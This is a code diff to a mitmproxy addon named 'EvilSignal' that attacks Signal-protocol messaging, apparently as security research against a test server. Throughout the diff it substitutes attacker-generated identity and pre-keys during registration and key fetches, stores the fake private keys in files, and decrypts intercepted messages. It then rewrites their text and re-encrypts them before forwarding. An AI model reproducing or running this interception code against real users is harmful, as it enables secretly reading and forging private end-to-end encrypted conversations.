@@ -1,3 +1,4 @@
+import base64
 from copy import deepcopy
 from mitmproxy.addonmanager import Loader
 from mitmproxy.http import HTTPFlow, Request, Response, Headers
@@ -14,8 +15,8 @@ import json
 from signal_protocol import state, helpers
 from signal_protocol.address import ProtocolAddress, DeviceId
 from signal_protocol.identity_key import IdentityKeyPair, IdentityKey
-from signal_protocol.curve import PublicKey
-from signal_protocol import kem, protocol
+from signal_protocol.curve import PublicKey, PrivateKey
+from signal_protocol import kem
 from base64 import b64decode, b64encode
 
 import utils
@@ -23,39 +24,26 @@ from database import User, Device, LegitBundle, MitMBundle
 from enum import Enum
 import parse
 
-# from protos.gen.wire_pb2 import *
-# from protos.gen.SignalService_pb2 import *
-# from protos.gen.storage_pb2 import *
 from protos.gen.WebSocketResources_pb2 import WebSocketMessage, WebSocketRequestMessage, WebSocketResponseMessage
-# from protos.gen.SignalService_pb2 import *
-# from protos.gen.sealed_sender_pb2 import *
-# from protos.gen import *
-
-# from server_proto import *
 from server_proto import addons, HOST_HTTPBIN
-# from mitm_interface import *
 from mitm_interface import MitmUser
 from collections import defaultdict
 
+
 # logging.getLogger().addHandler(utils.ColorHandler())
-# todo -- fix logging precendence -- https://stackoverflow.com/a/20280587
-logging.getLogger('passlib').setLevel(logging.ERROR)  # suppressing an issue coming from xepor -> passlib
-logging.getLogger('parse').setLevel(logging.ERROR)  # don't care
-logging.getLogger('peewee').setLevel(logging.WARN)  # peewee emits full SQL queries otherwise which is not great
-logging.getLogger('xepor.xepor').setLevel(logging.INFO)
-logging.getLogger('mitmproxy.proxy.server').setLevel(logging.WARN)  # too noisy
+# todo -- fix logging precedence -- https://stackoverflow.com/a/20280587
+# logging.getLogger('passlib').setLevel(logging.ERROR)  # suppressing an issue coming from xepor -> passlib
+# logging.getLogger('parse').setLevel(logging.ERROR)  # don't care
+# logging.getLogger('peewee').setLevel(logging.WARN)  # peewee emits full SQL queries otherwise which is not great
+# logging.getLogger('xepor.xepor').setLevel(logging.INFO)
+# logging.getLogger('mitmproxy.proxy.server').setLevel(logging.WARN)  # too noisy
 
 
 class CiphertextMessageType(Enum):
     WHISPER = 2
-    PREKEY_BUNDLE = 3
-    SENDERKEY_DISTRIBUTION = 7
+    PRE_KEY_BUNDLE = 3
+    SENDER_KEY_DISTRIBUTION = 7
     PLAINTEXT = 8
-
-
-class OutgoingMessageType(Enum):
-    PREKEY_BUNDLE = 3
-    UNIDENTIFIED = 6
 
 
 class EnvelopeType(Enum):
@@ -63,7 +51,7 @@ class EnvelopeType(Enum):
     UNKNOWN = 0
     CIPHERTEXT = 1
     KEY_EXCHANGE = 2
-    PREKEY_BUNDLE = 3
+    PRE_KEY_BUNDLE = 3
     RECEIPT = 5
     UNIDENTIFIED_SENDER = 6
     reserved_SENDERKEY_MESSAGE = 7
@@ -80,7 +68,7 @@ websocket_open_state = defaultdict(PendingWebSocket)
 
 
 @dataclass
-class KeyData():
+class KeyData:
     IdenKey: Optional[str] = None
     SignedPreKey: Optional[dict] = None
     pq_lastResortKey: Optional[dict] = None
@@ -88,8 +76,8 @@ class KeyData():
     pq_PreKeys: Optional[dict] = None
 
     fake_IdenKey: Optional[str] = None
-    fake_SignedPreKeys: Optional[dict] = None
-    fake_secret_SignedPreKeys: Optional[dict] = None
+    fake_signed_pre_key: Optional[dict] = None
+    fake_signed_pre_key_secret: Optional[str] = None
 
     fake_PreKeys: Optional[list[dict]] = None
     fake_secret_PreKeys: Optional[dict] = None
@@ -97,15 +85,16 @@ class KeyData():
     fake_pq_PreKeys: Optional[list[dict]] = None
     fake_secret_pq_PreKeys: Optional[dict] = None
 
-    fake_lastResortKey: Optional[dict] = None
-    fake_secret_lastResortKey: Optional[dict] = None
+    fake_last_resort_key: Optional[dict] = None
+    fake_secret_last_resort_key: Optional[str] = None
 
 
 @dataclass
-class RegistrationInfo():
+class RegistrationInfo:
     aci: Optional[str] = None
     pni: Optional[str] = None
     unidentifiedAccessKey: Optional[str] = None
+    registrationId: Optional[int] = None
 
     aciData: KeyData = None
     pniData: KeyData = None
@@ -121,7 +110,7 @@ class BobIdenKey():
 
 
 registration_info: dict[str, RegistrationInfo] = None
-conversation_session = dict()
+conversation_session: dict[str, (MitmUser, MitmUser)] = dict()
 bobs_bundle = dict()
 REGISTRATION_INFO_PATH = "registration_info.json"
 
@@ -133,6 +122,7 @@ class EvilSignal(InterceptedAPI):
 
     def __init__(self, wrapped_api: InterceptedAPI):
         self.wrapped_api = wrapped_api
+        logging.info(f"++++++++++++++++++++++++\nSTARTING mitm against: \n{HOST_HTTPBIN}\n++++++++++++++++++++++++")
         super().__init__(
             default_host=wrapped_api.default_host,
             host_mapping=wrapped_api.host_mapping,
@@ -191,6 +181,7 @@ def _v1_registration(flow: HTTPFlow):
         return
 
     unidentifiedAccessKey = req['accountAttributes']['unidentifiedAccessKey']
+    registrationId = req['accountAttributes']['registrationId']
 
     aci_IdenKey = req['aciIdentityKey']
     pni_IdenKey = req['pniIdentityKey']
@@ -204,55 +195,59 @@ def _v1_registration(flow: HTTPFlow):
     aci_fake_IdenKey = IdentityKeyPair.generate()
     pni_fake_IdenKey = IdentityKeyPair.generate()
 
-    fake_signed_pre_keys, fake_secret_SignedPreKeys = helpers.create_registration(aci_fake_IdenKey, pni_fake_IdenKey,
-                                                                                  aci_spk_id=aci_SignedPreKey['keyId'],
-                                                                                  pni_spk_id=pni_SignedPreKey['keyId'],
-                                                                                  aci_kyber_id=aci_pq_lastResortKey[
-                                                                                      'keyId'],
-                                                                                  pni_kyber_id=pni_pq_lastResortKey[
-                                                                                      'keyId'])
+    # create keys for registration record
+    fake_registration_keys, fake_registration_keys_secret = helpers.create_registration(
+        aci_fake_IdenKey,
+        pni_fake_IdenKey,
+        aci_spk_id=aci_SignedPreKey['keyId'],
+        pni_spk_id=pni_SignedPreKey['keyId'],
+        aci_kyber_id=aci_pq_lastResortKey['keyId'],
+        pni_kyber_id=pni_pq_lastResortKey['keyId'])
+
+    logging.info(f"Registration info (keys): {fake_registration_keys.keys()}")
 
     # todo: assert id's are the same ^^
-    assert fake_signed_pre_keys['aciSignedPreKey']['keyId'] == req['aciSignedPreKey'][
+    assert fake_registration_keys['aciSignedPreKey']['keyId'] == req['aciSignedPreKey'][
         'keyId'], "registration: keyId mismatch for aciSignedPreKey"
-    assert fake_signed_pre_keys['pniSignedPreKey']['keyId'] == req['pniSignedPreKey'][
+    assert fake_registration_keys['pniSignedPreKey']['keyId'] == req['pniSignedPreKey'][
         'keyId'], "registration: keyId mismatch for pniSignedPreKey"
-    assert fake_signed_pre_keys['aciPqLastResortPreKey']['keyId'] == req['aciPqLastResortPreKey'][
+    assert fake_registration_keys['aciPqLastResortPreKey']['keyId'] == req['aciPqLastResortPreKey'][
         'keyId'], "registration: keyId mismatch for aciPqLastResortPreKey"
-    assert fake_signed_pre_keys['pniPqLastResortPreKey']['keyId'] == req['pniPqLastResortPreKey'][
+    assert fake_registration_keys['pniPqLastResortPreKey']['keyId'] == req['pniPqLastResortPreKey'][
         'keyId'], "registration: keyId mismatch for pniPqLastResortPreKey"
 
-    req.update(fake_signed_pre_keys)
+    req.update(fake_registration_keys)
 
     registration_info[flow.client_conn.peername[0]] = RegistrationInfo(
         unidentifiedAccessKey=unidentifiedAccessKey,
+        registrationId=registrationId,
         aciData=KeyData(
             IdenKey=aci_IdenKey,
             SignedPreKey=aci_SignedPreKey,
             pq_lastResortKey=aci_pq_lastResortKey,
             fake_IdenKey=aci_fake_IdenKey.to_base64(),
-            fake_SignedPreKeys=fake_signed_pre_keys["aciSignedPreKey"],
-            fake_secret_SignedPreKeys=fake_secret_SignedPreKeys["aciSignedPreKeySecret"],
-            # fake_PreKeys = fake_signed_pre_keys["aciPreKey"],
-            # fake_secret_PreKeys = fake_secret_SignedPreKeys["aciPreKeySecret"],
-            # fake_pq_PreKeys = fake_signed_pre_keys["aciPqPreKey"],
-            # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["aciPqPreKeySecret"],
-            fake_lastResortKey=fake_signed_pre_keys["aciPqLastResortPreKey"],
-            fake_secret_lastResortKey=fake_secret_SignedPreKeys["aciPqLastResortSecret"]
+            fake_signed_pre_key=fake_registration_keys["aciSignedPreKey"],
+            fake_signed_pre_key_secret=fake_registration_keys_secret["aciSignedPreKeySecret"],
+            # fake_PreKeys = fake_registration_keys["aciPreKey"],
+            # fake_secret_PreKeys = fake_registration_keys_secret["aciPreKeySecret"],
+            # fake_pq_PreKeys = fake_registration_keys["aciPqPreKey"],
+            # fake_secret_pq_PreKeys = fake_registration_keys_secret["aciPqPreKeySecret"],
+            fake_last_resort_key=fake_registration_keys["aciPqLastResortPreKey"],
+            fake_secret_last_resort_key=fake_registration_keys_secret["aciPqLastResortSecret"]
         ),
         pniData=KeyData(
             IdenKey=pni_IdenKey,
             SignedPreKey=pni_SignedPreKey,
             pq_lastResortKey=pni_pq_lastResortKey,
             fake_IdenKey=pni_fake_IdenKey.to_base64(),
-            fake_SignedPreKeys=fake_signed_pre_keys["pniSignedPreKey"],
-            fake_secret_SignedPreKeys=fake_secret_SignedPreKeys["pniSignedPreKeySecret"],
-            # fake_PreKeys = fake_signed_pre_keys["pniPreKey"],
-            # fake_secret_PreKeys = fake_secret_SignedPreKeys["pniPreKeySecret"],
-            # fake_pq_PreKeys = fake_signed_pre_keys["pniPqPreKey"],
-            # fake_secret_pq_PreKeys = fake_secret_SignedPreKeys["pniPqPreKeySecret"],
-            fake_lastResortKey=fake_signed_pre_keys["pniPqLastResortPreKey"],
-            fake_secret_lastResortKey=fake_secret_SignedPreKeys["pniPqLastResortSecret"]
+            fake_signed_pre_key=fake_registration_keys["pniSignedPreKey"],
+            fake_signed_pre_key_secret=fake_registration_keys_secret["pniSignedPreKeySecret"],
+            # fake_PreKeys = fake_registration_keys["pniPreKey"],
+            # fake_secret_PreKeys = fake_registration_keys_secret["pniPreKeySecret"],
+            # fake_pq_PreKeys = fake_registration_keys["pniPqPreKey"],
+            # fake_secret_pq_PreKeys = fake_registration_keys_secret["pniPqPreKeySecret"],
+            fake_last_resort_key=fake_registration_keys["pniPqLastResortPreKey"],
+            fake_secret_last_resort_key=fake_registration_keys_secret["pniPqLastResortSecret"]
         )
     )
 
@@ -260,7 +255,11 @@ def _v1_registration(flow: HTTPFlow):
         data = json.dumps(registration_info, default=utils.dataclass_to_json)
         f.write(data)
 
-    flow.request.content = json.dumps(req).encode()
+    req_content = json.dumps(req).encode()
+    with open("debug/registration_req.json", "wb") as file:
+        file.write(req_content)
+
+    flow.request.content = req_content
 
 
 @api.route("/v1/verification/session", rtype=RouteType.RESPONSE)
@@ -276,7 +275,8 @@ def _v1_verif_errors(flow: HTTPFlow):
     }
     if status in failcases:
         resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
-        logging.warning(f"Registration failed with error code {status} {resp_name} -- {failcases[status]}")
+        logging.warning(
+            f"Registration failed with error code {status} {resp_name} -- {failcases[status]}]\n{flow.response.content}")
 
 
 @api.route("/v1/verification/session/{sessionId}/code", rtype=RouteType.RESPONSE)
@@ -284,8 +284,9 @@ def _v1_verif_error(flow: HTTPFlow, sessionId: str):
     status = flow.response.status_code
     if status < 300:
         return
+    resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
     logging.warning(
-        f"Registration for session {sessionId} will likely fail due to verification error, got {status}: {RESPONSES[status]}")
+        f"Registration for session {sessionId} will likely fail due to verification error, got {status}: {resp_name}\n{flow.response.content}")
 
 
 @api.route("/v1/registration", rtype=RouteType.RESPONSE)
@@ -293,20 +294,21 @@ def _v1_registration(flow: HTTPFlow):
     # todo - move to discrete route once xepor matching bug is fixed
     status = flow.response.status_code
     seconds_left = flow.response.headers.get("Retry-After", -1)
-    failcases = {
+    fail_cases = {
         403: "Verification failed for the provided Registration Recovery Password",
         409: "The caller has not explicitly elected to skip transferring data from another device, but a device transfer is technically possible",
         422: "The request did not pass validation: `isEverySignedKeyValid` (https://github.com/signalapp/Signal-Server/blob/9249cf240e7894b54638784340231a081a2e4eda/service/src/main/java/org/whispersystems/textsecuregcm/entities/RegistrationRequest.java#L100-L106) failed",
         423: "Registration Lock failure.",
         429: f"Too many attempts, try after {utils.human_time_duration(seconds_left)} ({seconds_left} seconds)"
     }
-    if status in failcases:
+    if status in fail_cases:
         resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
-        logging.warning(f"Registration failed with error code {status} {resp_name} -- {failcases[status]}")
+        logging.warning(
+            f"Registration failed with error code {status} {resp_name} -- {fail_cases[status]}\n{flow.response.content}"
+        )
         return
 
     resp = json.loads(flow.response.content)
-    # logging.info(f"RESPONSE: {resp}")
     ip_address = flow.client_conn.peername[0]
 
     with open(REGISTRATION_INFO_PATH, "r") as f:
@@ -351,19 +353,16 @@ def _v2_keys(flow: HTTPFlow):
 
     ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
     if not registration_info.get(address):
-        logging.warning(f"Address {address} not found in registration_info. {registration_info}")
+        logging.error(
+            f"Address {address} not found in registration_info. {registration_info}")  # if errors, might as well become starbucks baristas
         return
 
-    # try:
     key_data = registration_info.get(address).aciData if identity == "aci" else registration_info.get(address).pniData
-    # except AttributeError:
-    #     logging.warning(f"I cannot retrieve the regData for ip {address}.\n{registration_info}")
-    #     return
 
     try:
         alice_identity_key_pair = IdentityKeyPair.from_base64(key_data.fake_IdenKey.encode())
     except KeyError:
-        logging.exception(f"{flow} AND {registration_info}")
+        logging.error(f"{flow} AND {registration_info}")
         return
 
     pq_pre_keys = deepcopy(req["pqPreKeys"])
@@ -372,18 +371,34 @@ def _v2_keys(flow: HTTPFlow):
     key_data.pq_PreKeys = pq_pre_keys
     key_data.PreKeys = pre_keys
 
-    fake_pre_keys, fake_secret_PreKeys = helpers.create_keys_data(100, alice_identity_key_pair,
-                                                                  prekey_start_at=pre_keys[0]["keyId"],
-                                                                  kyber_prekey_start_at=pq_pre_keys[0]["keyId"])
+    from signal_protocol.curve import KeyPair
+    spk: KeyPair = KeyPair.from_public_and_private(
+        base64.b64decode(key_data.fake_signed_pre_key["publicKey"]),
+        base64.b64decode(key_data.fake_signed_pre_key_secret)
+    )
+
+    last_kyber: kem.KeyPair = kem.KeyPair.from_public_and_private(
+        base64.b64decode(key_data.fake_last_resort_key["publicKey"]),
+        base64.b64decode(key_data.fake_secret_last_resort_key)
+    )
+
+    fake_pre_keys, fake_secret_pre_keys = helpers.create_keys_data(
+        100,
+        alice_identity_key_pair,
+        spk,
+        last_kyber,
+        pre_keys[0]["keyId"],
+        pq_pre_keys[0]["keyId"]
+    ) ## spk is a string, wtf is the keyId?
 
     ## todo for later: Make sure all the keys we generate are stored in the database
 
     req.update(fake_pre_keys)
 
     key_data.fake_PreKeys = fake_pre_keys["preKeys"]
-    key_data.fake_secret_PreKeys = fake_secret_PreKeys["preKeys"]
+    key_data.fake_secret_PreKeys = fake_secret_pre_keys["preKeys"]
     key_data.fake_pq_PreKeys = fake_pre_keys["pqPreKeys"]
-    key_data.fake_secret_pq_PreKeys = fake_secret_PreKeys["pqPreKeys"]
+    key_data.fake_secret_pq_PreKeys = fake_secret_pre_keys["pqPreKeys"]
 
     legit_bundle = LegitBundle.insert(
         type=identity,
@@ -400,14 +415,14 @@ def _v2_keys(flow: HTTPFlow):
         "publicKey": b64encode(alice_identity_key_pair.public_key().serialize()).decode("utf-8"),
         "privateKey": b64encode(alice_identity_key_pair.private_key().serialize()).decode("utf-8")
     }
-    fake_spk = key_data.fake_SignedPreKeys
-    fake_spk["privateKey"] = deepcopy(key_data.fake_secret_SignedPreKeys)
-    prekeys = utils.json_join_public(key_data.fake_PreKeys, key_data.fake_secret_PreKeys)
+    fake_spk = key_data.fake_signed_pre_key
+    fake_spk["privateKey"] = deepcopy(key_data.fake_signed_pre_key_secret)
+    pre_keys = utils.json_join_public(key_data.fake_PreKeys, key_data.fake_secret_PreKeys)
     fake_kyber = utils.json_join_public(key_data.fake_pq_PreKeys, key_data.fake_secret_pq_PreKeys)
     fake_last_resort = {
-        "keyId": key_data.fake_lastResortKey["keyId"],
-        "publicKey": key_data.fake_lastResortKey["publicKey"],
-        "privateKey": key_data.fake_secret_lastResortKey
+        "keyId": key_data.fake_last_resort_key["keyId"],
+        "publicKey": key_data.fake_last_resort_key["publicKey"],
+        "privateKey": key_data.fake_secret_last_resort_key
     }
     mitm_bundle = MitMBundle.insert(
         type=identity,
@@ -415,7 +430,7 @@ def _v2_keys(flow: HTTPFlow):
         deviceId=1,  # todo: shouldnt be static
         FakeIdenKey=fake_ik,
         FakeSignedPreKey=fake_spk,
-        FakePrekeys=prekeys,
+        FakePrekeys=pre_keys,
         fakeKyberKeys=fake_kyber,
         fakeLastResortKyber=fake_last_resort
     )
@@ -430,32 +445,66 @@ def _v2_keys(flow: HTTPFlow):
     with open(REGISTRATION_INFO_PATH, "w") as f:
         f.write(json.dumps(registration_info, default=utils.dataclass_to_json))
 
-    flow.request.content = json.dumps(req).encode()
+    # req['pqLastResortPreKey'] = {
+    #     "keyId": fake_last_resort["keyId"],
+    #     "publicKey": fake_last_resort["publicKey"],
+    # } # todo: otherwise remove it
+    req['pqLastResortPreKey'] = None
+    req['signedPreKey'] = None
+    # todo: fix upstream
+
+    req_content = json.dumps(req).encode()
+    with open("debug/registration_keys.json", "wb") as file:
+        file.write(req_content)
+
+    flow.request.content = req_content
+
+
+@api.route("/v2/keys", rtype=RouteType.RESPONSE)
+def v2_keys_errors(flow: HTTPFlow):
+    status = flow.response.status_code
+    failcases = {
+        401: "Account authentication check failed.",
+        403: "Attempt to change identity key from a non-primary device.",
+        422: "Invalid request format (Invalid signatures -- not all sigs [pqPreKeys,pqLastResortPreKey,signedPreKey] are valid).",
+    }
+    if status in failcases:
+        resp_name = f"({RESPONSES[status]})" if status in RESPONSES else ""
+        logging.warning(
+            f"Registration failed with error code {status} {resp_name} -- {failcases[status]}\n{flow.request.content}")
 
 
 @api.route("/v2/keys/{identifier}/{device_id}", rtype=RouteType.RESPONSE, method=HTTPVerb.GET, allowed_statuses=[200])
-def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
+def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str):
     # TODO -- I need to be coherent if this endpoint is hit multiple times
-    # logging.exception((flow.response.content, identifier, device_id))
     global registration_info
 
     with open(REGISTRATION_INFO_PATH, "r") as f:
         registration_info = json_to_registrations(f.read())
 
     resp = json.loads(flow.response.content)
-    ip_address = flow.client_conn.address[0]
+    ip_address = flow.client_conn.peername[0]
 
     # logging.info(f"RESPONSE: {json.dumps(resp, indent=4)}")
     identity, uuid = utils.strip_uuid_and_id(identifier)
 
     bob_identity_key_public = b64decode(resp["identityKey"])
 
+    bobs_bundles = {}
     ############ MitmToBob setup (fake Alice)
     for id, bundle in enumerate(resp["devices"]):
         # data should be uuid of Alice and the device id (in this case 1 is ok)
-        fakeVictim = MitmUser(ProtocolAddress("fake_alice", 1))
+        fake_ikp = MitMBundle.get_identity_keypair(key_type="aci", aci=registration_info[ip_address].aci, device_id=1)
+        fake_ikp = IdentityKeyPair(
+            IdentityKey.from_base64(fake_ikp["publicKey"].encode()),
+            PrivateKey.from_base64(fake_ikp["privateKey"].encode())
+        )
+        alice_reg_id = registration_info[ip_address].registrationId
+        # todo: fucked has the wrong spk (id at least so probably fucked somewehre else too)
+        fakeVictim = MitmUser(ProtocolAddress(registration_info[ip_address].aci, bundle["deviceId"]), RID=alice_reg_id,
+                              identity_key=fake_ikp)
 
-        bob_registartion_id = bundle["registrationId"]
+        bob_registration_id = bundle["registrationId"]
 
         bob_kyber_pre_key = bundle["pqPreKey"]
         bob_kyber_pre_key_public = b64decode(bob_kyber_pre_key["publicKey"])
@@ -470,10 +519,10 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
         device_id = int(bundle["deviceId"])
 
         bob_bundle = state.PreKeyBundle(
-            bob_registartion_id,
+            bob_registration_id,
             DeviceId(device_id),
             (state.PreKeyId(bundle["preKey"]["keyId"]), PublicKey.deserialize(bob_pre_key_public)),
-            state.SignedPreKeyId(1),
+            state.SignedPreKeyId(bundle["signedPreKey"]["keyId"]),
             PublicKey.deserialize(bob_signed_pre_key_public),
             b64decode(bundle["signedPreKey"]["signature"] + "=="),
             IdentityKey(bob_identity_key_public),
@@ -505,7 +554,8 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             lastResortKyber=lastResortPq.pq_lastResortKey  # need to get from registration_info
         )
         legit_bundle.on_conflict_replace().execute()
-        fakeVictim.process_pre_key_bundle(ProtocolAddress(uuid, device_id), bob_bundle)
+        fakeVictim.process_pre_key_bundle(ProtocolAddress(identifier, device_id), bob_bundle)
+        bobs_bundles[device_id] = bob_bundle
 
     ############ Swap the prekeybundle TODO 
 
@@ -545,7 +595,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
                     "signedPreKey": {
                         "keyId": fakeBundle["signed_pre_key_id"],
                         "publicKey": fakeBundle["signed_pre_key_public"],
-                        "signature": fakeBundle["signed_pre_key_sign"][:-2]  #
+                        "signature": fakeBundle["signed_pre_key_sign"][:-2]  # todo: this freaks me out :/
                     },
                     "pqPreKey": {
                         "keyId": fakeBundle["kyber_pre_key_id"],
@@ -606,6 +656,9 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
     resp.update(fakeBundle_wire)
 
+    for device_id, bundle in bobs_bundles.items():
+        fakeUser.process_pre_key_bundle(ProtocolAddress(identifier, device_id), bundle)
+
     # ctx.options.conversation_session[] = (fakeVictim, fakeUser)
     # ctx.options.conversation_session = dict(ctx.options.conversation_session, **{f"{ip_address}:{uuid}": (fakeVictim, fakeUser)})
     # logging.warning(f"session {ctx.options.conversation_session}")
@@ -619,7 +672,12 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
     with open(REGISTRATION_INFO_PATH, "w") as f:
         f.write(json.dumps(registration_info, default=utils.dataclass_to_json))
-    flow.response.content = json.dumps(resp, sort_keys=True).encode()
+
+    resp_content = json.dumps(resp).encode()
+    with open(f"debug/fake_keys_{identifier}.json", "wb") as file:
+        file.write(resp_content)
+
+    flow.response.content = resp_content
 
 
 def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
@@ -718,12 +776,13 @@ def _v1_ws_message(flow, identifier):
 
     identifier, destination = utils.strip_uuid_and_id(destination_user)
 
-    logging.warning(conversation_session)
+    logging.warning(conversation_session.keys())
 
-    session = conversation_session.get(f"{ip_address}:{destination}")
+    session: (MitmUser, MitmUser) = conversation_session.get(f"{ip_address}:{destination}")
 
     if session:
-        fakeVictim, fakeUser = session
+        fakeVictim: MitmUser = session[0]
+        fakeUser: MitmUser = session[1]
     else:
         # logging.error(f"Session not found for {ip_address} and {destination}")
         return
@@ -737,20 +796,50 @@ def _v1_ws_message(flow, identifier):
         envelope_type = EnvelopeType(int(msg['type']))
         logging.warning(f"MESSAGE (Envelope) TYPE: {envelope_type}")
 
-        if envelope_type not in [EnvelopeType.PREKEY_BUNDLE]:
+        if envelope_type not in [EnvelopeType.PRE_KEY_BUNDLE]:
             logging.warning(f"Only PREKEY_BUNDLE is supported at the moment, got {envelope_type}. C.f. my Twint ;)")
             continue
 
         content = b64decode(msg["content"])
 
-        msg_type = OutgoingMessageType(int(msg["type"]))
-        if msg_type == OutgoingMessageType.PREKEY_BUNDLE:
+        msg_type = EnvelopeType(int(msg["type"]))
+
+        from protos.gen.SignalService_pb2 import Content
+        from signal_protocol.protocol import CiphertextMessage
+
+        if msg_type == EnvelopeType.PRE_KEY_BUNDLE:
             try:
-                dec = fakeUser.decrypt(ProtocolAddress(destination, msg["destinationDeviceId"]), content)
+                dec: Content = fakeUser.decrypt(ProtocolAddress(destination, msg["destinationDeviceId"]), content)
                 logging.warning(f"DECRYPTION IS:\n{dec}")
             except Exception as e:
                 logging.warning(f"DECRYPTION FAILED: {e}")
-                logging.warning(f"RAW content: {msg['content']}")
+                logging.warning(f"RAW content: {content}")
+                return  # no point trying to re-encrypt
+
+            try:
+                if dec.typingMessage.timestamp == 0:
+                    # not a timestamp message
+                    out_msg = f"bist du ein 🐿️? -- От судьбы не уйти.! [orig msg was: {dec.dataMessage.body}]\nPowered by SCION(https://www.youtube.com/watch?v=CzXJ0i4xABI)".encode()
+                    to_enc = Content()
+                    to_enc.CopyFrom(dec)
+                    to_enc.dataMessage.body = out_msg
+                else:
+                    to_enc = Content()
+                    to_enc.CopyFrom(dec)
+
+                enc : CiphertextMessage = fakeVictim.encrypt(ProtocolAddress(destination_user, 1), to_enc.SerializeToString())
+                # enc: CiphertextMessage = fakeUser.encrypt(ProtocolAddress(destination_user, 1),
+                #                                           to_enc.SerializeToString())
+                logging.info(f"Created CTXT: {enc}")
+                logging.warning(f"NEW ENCRYPTION (type - {enc.message_type()}): {enc}")
+                msg["content"] = b64encode(enc.serialize()).decode()
+                logging.warning(
+                    f"DEBUG for fakeVictim ({fakeVictim.registration_id}):\naddr: {fakeVictim.address}\nSPK:{fakeVictim.store.all_signed_pre_key_ids()}")
+                logging.warning(f"content {msg['content']}")
+            except Exception as e:
+                logging.warning(f"ENCRYPTION FAILED: {e}")
+    logging.warning(f"Sending the json on the wire: {json.dumps(req)}")
+    return json.dumps(req)
 
 
 def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
@@ -784,7 +873,8 @@ ws_resp = Router()
 
 ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}/{credentialRequest}"), HTTPVerb.ANY,
                   _v1_ws_my_profile, None)
-ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut, None)
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut,
+                  None)
 ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)
 ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)
 
@@ -823,6 +913,8 @@ def _v1_websocket_req(flow: HTTPFlow, msg):
         msg.injected = True
         req = handler(f, *params.fixed, **params.named)
         if req:
+            if isinstance(req, str):
+                req = req.encode()
             # msg. = resp
             new_ws = WebSocketMessage()
             new_ws.ParseFromString(msg.content)
@@ -884,18 +976,18 @@ if __name__ == "__main__":
     f.close()
 
     params = [
-            # "-q",   # quiet flag, only script's output
-            "--mode",
-            "transparent",
-            "--showhost",
-            "--ssl-insecure",
-            "--ignore-hosts",
-            config.IGNORE_HOSTS,
-            "-s",  # script flag
-            __file__,  # use the same file as the hook
-            # "-r",
-            # "mitmproxy_flows/PQ_registration"
-            "-w",
-            flow_name
-        ]
+        # "-q",   # quiet flag, only script's output
+        "--mode",
+        "transparent",
+        "--showhost",
+        "--ssl-insecure",
+        "--ignore-hosts",
+        config.IGNORE_HOSTS,
+        "-s",  # script flag
+        __file__,  # use the same file as the hook
+        # "-r",
+        # "mitmproxy_flows/PQ_registration"
+        "-w",
+        flow_name
+    ]
     mitmdump(params)
